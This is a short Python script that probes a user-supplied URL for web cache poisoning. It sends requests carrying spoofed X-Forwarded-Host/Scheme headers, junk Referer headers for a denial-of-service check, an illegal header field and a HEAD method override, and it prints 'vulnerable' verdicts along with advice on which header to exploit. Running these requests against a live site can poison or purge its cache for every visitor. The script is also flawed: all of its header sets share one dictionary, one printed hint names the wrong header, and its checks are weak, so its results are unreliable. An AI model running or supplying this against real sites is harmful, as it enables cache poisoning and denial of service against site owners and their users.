import requests

domain = "bing.com"

url = input()
response = requests.get(url)

# if "X-Cache" in response.headers or "Age" in response.headers or "Via" in response.headers:
#     pass

request_headers = response.request.headers
basic_headers = scheme_headers = dos_headers = illegal_headers = head_header = request_headers

#Basic Attack
basic_headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
                        "X-Forwarded-Host": domain, "X-Forwarded-For": domain, "X-Host": domain, "X-Forwarded-Server": domain})

response = requests.get(url, headers=basic_headers)
if domain in response.text:
    print("vulnerable to cache poisoning, use X-Forwarded-Host header")


#x-forwarded-scheme
scheme_headers.update({"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
                        "X-Forwarded-Scheme": "http"})
response = requests.get(url, headers=scheme_headers)
if (response.status_code == 301 or response.status_code == 302 or response.status_code == 307):
    print("vulnerable to cache poisoning, use X-Forwarded-Scheme header")

#cache poisoning DoS
dos_headers.update({"User-Agent": "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
                        "Referer": "abc", "My-Referer": "xyz"})
response = requests.get(url, headers=dos_headers)
if (response.status_code == 400):
    print("vulnerable to DoS cache poisoning if ASP.net is used")



# Illegal Header Fields
illegal_headers.update({"//":"3", "User-Agent": "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254"})

response = requests.get(url, headers=illegal_headers)
if (response.status_code == 400):
    print("vulnerable to Illegal Header Fields cache poisoning.. use '\': '3' as header")


# Clear the cache
head_header.update({"User-Agent": "Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36", "x-http-method-override": "HEAD"})

response = requests.get(url, headers=head_header)
if (response.status_code == 200):
    print("vulnerable to PURGE clearing cache, it is possible forr to clear the cache for actual JS or CSS files and poison it with an empty response cache poisoning.. use 'x-http-method-override': 'HEAD'")

